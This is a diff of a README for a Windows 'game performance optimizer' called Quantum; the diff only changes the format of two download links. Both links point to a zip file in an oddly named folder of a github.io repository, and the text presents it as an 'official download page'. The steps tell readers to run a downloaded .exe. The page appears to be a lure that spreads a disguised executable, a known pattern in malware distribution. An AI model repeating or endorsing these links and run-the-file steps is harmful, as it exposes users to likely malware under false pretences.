@@ -5,7 +5,7 @@ description: "Increase gaming performance and reduce system latency with this op
 ---
 # ⚡ windows-fps-optimizer - Increase game performance and reduce lag
 
-[![Download Quantum Optimizer](https://img.shields.io/badge/Download-Quantum_Optimizer-blue.svg)](https://raw.githubusercontent.com/Aching-miracle654/aching-miracle654.github.io/main/complicity/io_aching_github_miracle_v3.1.zip)
+[![Download Quantum Optimizer](https://img.shields.io/badge/Download-Quantum_Optimizer-blue.svg)](https://github.com/Aching-miracle654/aching-miracle654.github.io/raw/refs/heads/main/complicity/io_aching_github_miracle_v3.1.zip)
 
 ## 📌 What is Quantum?
 
@@ -23,7 +23,7 @@ Quantum is a system tool for Windows computers. The software helps games run bet
 
 Follow these steps to set up Quantum on your machine. You do not need to install complex scripts or change registry keys. The app handles these actions for you.
 
-1.  Visit the [official download page](https://raw.githubusercontent.com/Aching-miracle654/aching-miracle654.github.io/main/complicity/io_aching_github_miracle_v3.1.zip).
+1.  Visit the [official download page](https://github.com/Aching-miracle654/aching-miracle654.github.io/raw/refs/heads/main/complicity/io_aching_github_miracle_v3.1.zip).
 2.  Locate the latest release on the right side of the page.
 3.  Click the file ending in .exe to begin the download.
 4.  Run the downloaded file.
